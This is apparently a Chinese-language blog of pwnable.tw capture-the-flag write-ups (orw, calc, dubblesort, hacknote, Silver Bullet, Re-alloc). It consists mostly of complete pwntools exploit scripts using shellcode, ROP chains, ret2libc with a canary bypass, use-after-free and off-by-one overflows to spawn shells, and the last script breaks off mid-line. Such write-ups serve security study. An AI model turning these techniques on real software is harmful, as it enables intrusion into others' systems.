<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#mobile</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">'./orw'</span></span><br><span class="line"><span class="comment">#p = process(filename)</span></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Give my your shellcode:"</span>)</span><br><span class="line">payload = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">push 0x00006761</span></span><br><span class="line"><span class="string">push 0x6c662f77</span></span><br><span class="line"><span class="string">push 0x726f2f65</span></span><br><span class="line"><span class="string">push 0x6d6f682f</span></span><br><span class="line"><span class="string">mov eax,0x5</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">mov ebx,eax</span></span><br><span class="line"><span class="string">mov ecx,esp</span></span><br><span class="line"><span class="string">mov edx,0x30</span></span><br><span class="line"><span class="string">mov eax,0x3</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">mov ebx,0x1</span></span><br><span class="line"><span class="string">mov eax,0x4</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="CVE-2018-1160"><a href="#CVE-2018-1160" class="headerlink" title="CVE-2018-1160"></a>CVE-2018-1160</h2><p><a href="https://xz.aliyun.com/t/3710?spm=5176.12901015.0.i12901015.1d27525cNPKLYj#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/3710?spm=5176.12901015.0.i12901015.1d27525cNPKLYj#toc-0</a></p>
<p><a href="https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172" target="_blank" rel="noopener">https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172</a></p>
<p><a href="https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172" target="_blank" rel="noopener">https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172</a></p>
<h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><blockquote>
<p>实现了一个计算器的功能，由于逻辑不严密，导致可以构造非法式子，修改内存的值。</p>
<p>需要耐心分析程序，<del>maybe还需要脑洞大开</del></p>
</blockquote>
<p><img src="/2021/01/09/16-07/image-20210108173852141.png" alt="image-20210108173852141"></p>
<p>主函数很简单，主要看calc函数</p>
<p><img src="/2021/01/09/16-07/image-20210108174030310.png" alt="image-20210108174030310"></p>
<p>主要有三个函数，get_expr用来输入计算公式并过滤非法字符；init_pool在站上分配一段空间并将内容清0；parse_expr是主要函数，用于对计算公式解析并计算。最后由printf函数打印输出结果。</p>
<p>注意：函数结束的条件是<code>!get_expr((int)&amp;expr_0, 1024)</code>输入的字符串长度大于1024，然后可以返回main继续执行。</p>
<h3 id="bzero函数"><a href="#bzero函数" class="headerlink" title="bzero函数"></a>bzero函数</h3><p>原型：extern void bzero（void *s, int n）;</p>
<ul>
<li>s 要置零的数据的起始地址</li>
<li>n 要置零的数据字节个数</li>
</ul>
<p><img src="/2021/01/09/16-07/image-20210108174912889.png" alt="image-20210108174912889"></p>
<p><img src="/2021/01/09/16-07/image-20210108175150201.png" alt="image-20210108175150201"></p>
<p><img src="/2021/01/09/16-07/image-20210110211310303.png" alt="image-20210110211310303"></p>
<p><img src="/2021/01/09/16-07/image-20210110211900726.png" alt="image-20210110211900726"></p>
<p>这里需要好好理解。</p>
<p>漏洞在于，</p>
<p><img src="/2021/01/09/16-07/image-20210110212502340.png" alt="image-20210110212502340"></p>
<p><img src="/2021/01/09/16-07/image-20210110213412358.png" alt="image-20210110213412358"></p>
<p>最后在栈内布置如下rop</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>值</th>
<th>注释</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x0805c34b</td>
<td>pop eax ; ret</td>
</tr>
<tr>
<td>11</td>
<td>数值</td>
</tr>
<tr>
<td>0x080701aa</td>
<td>pop edx ; ret</td>
</tr>
<tr>
<td>0</td>
<td>数值</td>
</tr>
<tr>
<td>0x080701d1</td>
<td>pop ecx ; pop ebx ; ret</td>
</tr>
<tr>
<td>0</td>
<td>数值</td>
</tr>
<tr>
<td>binsh地址</td>
<td>通过main ebp计算得到</td>
</tr>
<tr>
<td>0x08049a21</td>
<td>int 0x80</td>
</tr>
<tr>
<td>0x6E69622f</td>
<td>“/bin”</td>
</tr>
<tr>
<td>0x0068732f</td>
<td>“/sh\x00”</td>
</tr>
</tbody>
</table>
</div>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">'./calc'</span></span><br><span class="line">p = process(filename)</span><br><span class="line"><span class="comment">#p = remote("chall.pwnable.tw",10100)</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p.recvuntil(<span class="string">"==="</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"+360"</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">ebp_base = p.recv()</span><br><span class="line">ebp_base = int(ebp_base)</span><br><span class="line">print(<span class="string">"[*]ebp_base1:"</span>+str(ebp_base))</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[*]ebp_base2:"</span>+hex( int(ebp_base) &amp; <span class="number">0xffffffff</span> ))</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"+361+77490"</span></span><br><span class="line">payload2 = <span class="string">"+362-77479"</span></span><br><span class="line">payload3 = <span class="string">"+363+134599427"</span></span><br><span class="line">payload4 = <span class="string">"+364-134599427"</span></span><br><span class="line">payload5 = <span class="string">"+365+77518"</span></span><br><span class="line">payload6 = <span class="string">"+366-77518"</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.sendline(payload4)</span><br><span class="line">p.sendline(payload5)</span><br><span class="line">p.sendline(payload6)</span><br><span class="line"></span><br><span class="line">bin_sh_addr=ebp_base + <span class="number">4</span></span><br><span class="line">diff_367=bin_sh_addr - <span class="number">77518</span></span><br><span class="line">p.sendline(<span class="string">'+367'</span>+str(diff_367))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'+368'</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">num_368 = p.recvline()</span><br><span class="line">diff_368 =  <span class="number">134519329</span> - int(num_368)</span><br><span class="line">print(<span class="string">"[*]diff_368:"</span>+str(diff_368))</span><br><span class="line">print(<span class="string">"[*]num_368:"</span>+str(num_368))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"+368"</span>)</span><br><span class="line">p.sendline(<span class="string">"+368+"</span>+str(diff_368))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"+369"</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">num_369 = p.recvline()</span><br><span class="line">diff_369 = <span class="number">1852400175</span> - int(num_369)</span><br><span class="line">p.sendline(<span class="string">"+369+"</span>+str(diff_369))</span><br><span class="line">print(<span class="string">"[*]num_369:"</span>+str(num_369))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"+370"</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">num_370 = p.recvline()</span><br><span class="line">print(<span class="string">"[*]num_370:"</span>+str(num_370))</span><br><span class="line">diff_370 = int(num_370) - <span class="number">6845231</span></span><br><span class="line">p.sendline(<span class="string">"+370-"</span>+str(diff_370))</span><br><span class="line">print(<span class="string">"[*]diff_370:"</span>+str(diff_370))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"a"</span>*<span class="number">2048</span>)</span><br><span class="line">p.sendline(<span class="string">"+361"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>参考：</p>
<p><a href="https://www.freebuf.com/articles/system/189636.html" target="_blank" rel="noopener">从pwnable.tw-calc看数组越界造成的任意地址读写</a></p>
<p>youtube上视频：<a href="https://www.youtube.com/watch?v=LTgNNE04x2w" target="_blank" rel="noopener">https://www.youtube.com/watch?v=LTgNNE04x2w</a></p>
<h2 id="3-17"><a href="#3-17" class="headerlink" title="3* 17"></a>3* 17</h2><h2 id="dubblesort"><a href="#dubblesort" class="headerlink" title="dubblesort"></a>dubblesort</h2><blockquote>
<p>保护全开、栈溢出</p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
<li>输入name    =&gt;    字符串没有’\x00’截断，信息泄露，计算libc基址</li>
<li>输入sort的数字个数    =&gt;     个数任意</li>
<li>输入数字到arr_sort数组    =&gt;        数组在[esp+1Ch]的位置【注意：这里gdb调试的时候用ebp不好使，，，】</li>
<li>sort进行排序    =&gt;     数据从小到大输入才不会被改变</li>
</ol>
<blockquote>
<p>故如果个数较大，使得输入的数据能够覆盖返回地址和参数，即可getshell</p>
</blockquote>
<h4 id="1-name-libc基址"><a href="#1-name-libc基址" class="headerlink" title="1.name(libc基址)"></a>1.name(libc基址)</h4><p>令<code>name=“aaaa”</code>，查看内存，故令name为“a”×0x18，最后还要发送回车或其他覆盖泄漏地址的低字节。</p>
<p><img src="/2021/01/09/16-07/image-20210113094525538.png" alt="image-20210113094525538"></p>
<p><strong>这里基址的获取不等于<code>0xf7f55000 - 0xf7da2000 = 0x1B3000</code>，因为本地libc库和目标系统的libc库不一样，偏移也就不同！</strong></p>
<h5 id="libc基址偏移的获取"><a href="#libc基址偏移的获取" class="headerlink" title="libc基址偏移的获取"></a>libc基址偏移的获取</h5><p>使用命令<code>readelf -S libc_32.so.6</code>查找<code>.got.plt</code>段的起始地址即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;tw$ readelf -S libc_32.so.6 </span><br><span class="line">There are 68 section headers, starting at offset 0x1b0cc8:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [...]</span><br><span class="line">  [31] .got.plt          PROGBITS        001b0000 1af000 000030 04  WA  0   0  4</span><br></pre></td></tr></table></figure>
<p>也就是起始地址为<code>0x001b0000</code></p>
<h5 id="system和”-bin-sh-x00”偏移"><a href="#system和”-bin-sh-x00”偏移" class="headerlink" title="system和”/bin/sh\x00”偏移"></a>system和”/bin/sh\x00”偏移</h5><p>system地址的获取指令：<code>readelf -s libc_32.so.6 | grep system</code>【注意：s是小写】</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;tw$ readelf -s libc_32.so.6 | grep system</span><br><span class="line">   245: 00110690    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0</span><br><span class="line">   627: 0003a940    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE</span><br><span class="line">  1457: 0003a940    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0</span><br></pre></td></tr></table></figure>
<p>“/bin/sh\x00”获取：使用hex软件查找字符串”/bin/sh”</p>
<p><img src="/2021/01/09/16-07/image-20210113101221317.png" alt="image-20210113101221317"></p>
<p>【直接ida搜索字符串找不到该地址，，，可能由于不再字符串段？】<a href="https://hxd.en.softonic.com/" target="_blank" rel="noopener">hex下载地址</a></p>
<h3 id="覆盖返回地址"><a href="#覆盖返回地址" class="headerlink" title="覆盖返回地址"></a>覆盖返回地址</h3><p>ida里面显示数组情况：<code>int arr_sort; // [esp+1Ch] [ebp-70h]</code>，但是由于esp计算是正确的，ebp不对。</p>
<p>根据调试得到，覆盖到canary需要0x18个字节。</p>
<p><img src="/2021/01/09/16-07/image-20210113102645806.png" alt="image-20210113102645806"></p>
<p><img src="/2021/01/09/16-07/image-20210113102755565.png" alt="image-20210113102755565"></p>
<h4 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h4><p>因为不能覆盖canary，所以要想办法不改变它的值。</p>
<p>方法是输入“+”或者“-”</p>
<p><img src="/2021/01/09/16-07/image-20210113102947391.png" alt="image-20210113102947391"></p>
<p>发现通过输入“+”、“-”并不会修改它的值。</p>
<p><img src="/2021/01/09/16-07/image-20210113103843869.png" alt="image-20210113103843869"></p>
<p>所以，接下来都填充成system函数，需要9个，接着填上“/bin/sh”的地址。</p>
<p>注意：【一般canary会小于system函数地址（0xf7开头），而libc中system又在“/bin/sh“之前，所以实现从小到大，sort后不会改变顺序，不能用“||sh”,因为大小小于system的地址。】</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding = utf - 8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">'./dubblesort'</span></span><br><span class="line">p = process(filename)</span><br><span class="line"><span class="comment">#p = remote("chall.pwnable.tw", 10101)</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"What your name :"</span>)</span><br><span class="line">p.sendline(<span class="string">"aaaa"</span>*<span class="number">6</span>)</span><br><span class="line">p.recvuntil(<span class="string">"aaaa"</span>*<span class="number">6</span>)</span><br><span class="line">leak_me = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line">log.success(<span class="string">"leak:"</span>+hex(leak_me))</span><br><span class="line"></span><br><span class="line">libc_base = leak_me - <span class="number">0x1B000a</span></span><br><span class="line">system = libc_base + <span class="number">0x0003a940</span></span><br><span class="line">binsh = libc_base + <span class="number">0x158e8b</span></span><br><span class="line">log.success(<span class="string">"system:"</span>+hex(system))</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil("numbers do you what to sort :")</span></span><br><span class="line">p.sendline(<span class="string">"35"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_send</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	log.success(<span class="string">"idx:"</span>+str(idx))</span><br><span class="line">	p.recvuntil(str(idx)+<span class="string">" number : "</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">	print(i)</span><br><span class="line">	my_send(i,str(i))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">my_send(<span class="number">24</span>,<span class="string">"+"</span>)<span class="comment">#canary</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">	my_send(int(<span class="number">25</span>+i),str(system))</span><br><span class="line">my_send(<span class="number">34</span>,str(binsh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>参考：</p>
<ol>
<li><a href="https://www.freebuf.com/articles/others-articles/134271.html" target="_blank" rel="noopener">pwnable.tw刷题之dubblesort</a></li>
</ol>
<h2 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h2><blockquote>
<p>简单的堆题，uaf（类似于hitcon的uaf）</p>
<p>难点在于libc没有字符串’/bin/sh’，解决方法在于直接将字符串“||sh”作为字符串地址传入即可。</p>
</blockquote>
<p><img src="/2021/01/09/16-07/image-20210110205251966.png" alt="image-20210110205251966"></p>
<p>打印内容的语句，能否打印是判断该idx的ptr[i]是否存在</p>
<p><img src="/2021/01/09/16-07/image-20210110205533787.png" alt="image-20210110205533787"></p>
<p><img src="/2021/01/09/16-07/image-20210110205601001.png" alt="image-20210110205601001"></p>
<p>首先修改参数为got表地址，泄漏libc基址，然后修改函数地址为system，后面为“||sh”</p>
<h3 id="system-getshell参数"><a href="#system-getshell参数" class="headerlink" title="system getshell参数"></a>system getshell参数</h3><ol>
<li>‘/bin/sh’字符串地址</li>
<li>‘sh’字符串地址</li>
<li>‘||sh’字符串（感觉非常有用，，，哈哈哈）</li>
</ol>
<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">'./hacknote_4'</span></span><br><span class="line">p = process(filename)</span><br><span class="line">p=remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10102</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./hacknote_4"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Note size :"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content :"</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	<span class="comment">#p.recvuntil("Your choice :")</span></span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#申请两个非0大小的块(而且要一样，不然不好使【不知道为什么，大佬教教我。。。】)</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'aaaa'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'bbbb'</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)<span class="comment">#0</span></span><br><span class="line">delete(<span class="number">1</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将两个块的头malloc，其中一个还是ptr[i]，另一个0x8大小的作为数据区</span></span><br><span class="line">add(<span class="number">0x8</span>,p32(<span class="number">0x0804862b</span>)+p32(elf.got[<span class="string">'atoi'</span>]))<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#因为原先两个ptr[i]都申请回来了，所以可以将上面前四个字节作为函数，后四个字节作为参数地址。</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">atoi_addr = (u32(p.recv()[:<span class="number">4</span>]))</span><br><span class="line">log.success(<span class="string">"atoi:"</span>+str(atoi_addr))</span><br><span class="line"></span><br><span class="line">libc_base = (atoi_addr) - (libc.symbols[<span class="string">'atoi'</span>])</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">"system:"</span>+hex(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#因为没有edit函数，所以先delete再add做修改。</span></span><br><span class="line">delete(<span class="number">2</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x8</span>,p32(system_addr)+<span class="string">'||sh'</span>)<span class="comment">#3</span></span><br><span class="line">show(<span class="number">0</span>)<span class="comment">#调用</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="Silver-Bullet"><a href="#Silver-Bullet" class="headerlink" title="Silver Bullet"></a>Silver Bullet</h2><blockquote>
<p>off by one修改大小，造成栈溢出。</p>
<p>程序流程，分别是创建，edit修改（使用了strncat）和根据长度减去hp，可以退出循环</p>
</blockquote>
<h3 id="strncat"><a href="#strncat" class="headerlink" title="strncat"></a>strncat</h3><p><strong>原型</strong></p>
<p><code>char \* strncat(char *dest, const char *src, size_t n);</code></p>
<ul>
<li>dest指向目标字符串</li>
<li>src为指向源字符串。</li>
</ul>
<p>strncat()会将dest字符串最后的’\0’覆盖掉，字符追加完成后，再追加’\0’。</p>
<h3 id="程序流程-1"><a href="#程序流程-1" class="headerlink" title="程序流程"></a>程序流程</h3><p><img src="/2021/01/09/16-07/image-20210115105743970.png" alt="image-20210115105743970"></p>
<p>因为数据最大是0，所以<code>*((_DWORD *)s + 12) = v2;</code>刚好在数据相邻后面的位置上。</p>
<p><img src="/2021/01/09/16-07/image-20210115110048753.png" alt="image-20210115110048753"></p>
<p><img src="/2021/01/09/16-07/image-20210115110545658.png" alt="image-20210115110545658"></p>
<p><img src="/2021/01/09/16-07/image-20210115110401451.png" alt="image-20210115110401451"></p>
<p>所以，如果第一次输入40个数据，第二次输入8，那么数据长度变为8，还可以继续输入，造成栈溢出</p>
<p><img src="/2021/01/09/16-07/image-20210115111613400.png" alt="image-20210115111613400"></p>
<p>但是要程序返回的话，要需要返回，只有beat函数里面win才能return 0</p>
<p><img src="/2021/01/09/16-07/image-20210115112152972.png" alt="image-20210115112152972"></p>
<p>所以覆盖长度大于<img src="/2021/01/09/16-07/image-20210115112229004.png" alt="image-20210115112229004">，接着覆盖返回地址为输出函数，泄漏got表信息，得到基址，计算system和‘/bin/sh’地址，覆盖返回地址的返回地址为main函数，再次执行覆盖长度，填充返回地址即可得到shell。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#mobile</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">'./silver_bullet'</span></span><br><span class="line">p = process(filename)</span><br><span class="line"><span class="comment">#p = remote("chall.pwnable.tw",10103)</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./silver_bullet"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(content)</span>:</span></span><br><span class="line">	<span class="comment">#cmd(1)</span></span><br><span class="line">	p.sendline(str(<span class="number">1</span>))</span><br><span class="line">	p.recvuntil(<span class="string">"Give me your description of bullet :"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(content)</span>:</span></span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Give me your another description of bullet :"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line">add(<span class="string">"a"</span>*<span class="number">40</span>)</span><br><span class="line">edit(<span class="string">"a"</span>*<span class="number">8</span>)<span class="comment">#off by one</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">main = <span class="number">0x08048954</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\xff'</span>*<span class="number">7</span>+p32(puts_plt)+p32(main)+p32(puts_got)<span class="comment">#覆盖长度、返回地址为输出函数</span></span><br><span class="line">edit(payload)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">3</span>)<span class="comment">#win，return 0</span></span><br><span class="line">p.recvuntil(<span class="string">"Oh ! You win !!\n"</span>)</span><br><span class="line">puts_addr = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line">log.success(<span class="string">"puts:"</span>+hex(puts_addr))<span class="comment">#得到puts的got表信息</span></span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二次main函数</span></span><br><span class="line">add(<span class="string">"a"</span>*<span class="number">40</span>)<span class="comment">#再次覆盖长度</span></span><br><span class="line">edit(<span class="string">"a"</span>*<span class="number">8</span>)</span><br><span class="line">payload = <span class="string">'\xff'</span>*<span class="number">7</span>+p32(system)+p32(main)+p32(binsh)<span class="comment">#覆盖返回地址为system</span></span><br><span class="line">edit(payload)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="Re-alloc"><a href="#Re-alloc" class="headerlink" title="Re-alloc"></a>Re-alloc</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">2</span> <span class="keyword">and</span> (sys.argv[<span class="number">1</span>] == <span class="string">'DEBUG'</span> <span class="keyword">or</span> sys.argv[<span class="number">1</span>] == <span class="string">'debug'</span>):</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">'./re-alloc'</span>)</span><br><span class="line">	elf = ELF(<span class="string">'./re-alloc'</span>)</span><br><span class="line">	libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="string">"10106"</span>)</span><br><span class="line">	elf = ELF(<span class="string">'./re-alloc'</span>)</span><br><span class="line">	libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr=<span class="number">0</span>,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"breakpoint_addr --&gt; "</span> + hex(text_base + <span class="number">0x202040</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr))) </span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">sda = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(name,addr)</span>:</span></span><br><span class="line">	log.info(name + <span class="string">" --&gt; %s"</span>,hex(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>	<span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">	sla(<span class="string">"choice: "</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>	<span class="title">add</span><span class="params">(idx,size,data)</span>:</span></span><br><span class="line">	choice(<span class="number">1</span>)</span><br><span class="line">	sla(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line">	sla(<span class="string">"Size:"</span>,str(size))</span><br><span class="line">	sda(<span class="string">"Data:"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>	<span class="title">realloc</span><span class="params">(idx,size,data=<span class="string">''</span>)</span>:</span></span><br><span class="line">	choice(<span class="number">2</span>)</span><br><span class="line">	sla(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line">	sla(<span class="string">"Size:"</span>,str(size))</span><br><span class="line">	<span class="keyword">if</span> size != <span class="number">0</span>:</span><br><span class="line">		sda(<span class="string">"Data:"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>	<span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">	choice(<span class="number">3</span>)</span><br><span class="line">	sla(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">8</span>,<span 